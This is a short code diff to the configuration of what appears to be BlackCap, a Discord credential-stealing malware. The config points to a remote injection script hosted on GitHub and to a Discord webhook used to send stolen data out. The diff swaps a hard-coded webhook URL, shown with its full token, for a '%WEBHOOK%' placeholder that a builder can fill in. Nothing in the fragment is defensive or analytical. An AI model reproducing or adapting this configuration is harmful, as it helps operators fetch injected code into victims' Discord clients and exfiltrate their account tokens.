@@ -28,7 +28,7 @@ const config = {
     "embed-color": 374276,
 
  injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
- webhook: "https://discord.com/api/webhooks/1024574369252524033/S2HJ_zAA6uqDns9OrpUZB52UyAZF-m5inqMEG_l2vp69yuHzrQIiPn5Lx8JvNAIgTTSW",
+ webhook: "%WEBHOOK%",
  filter2: {
     urls: [
       "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
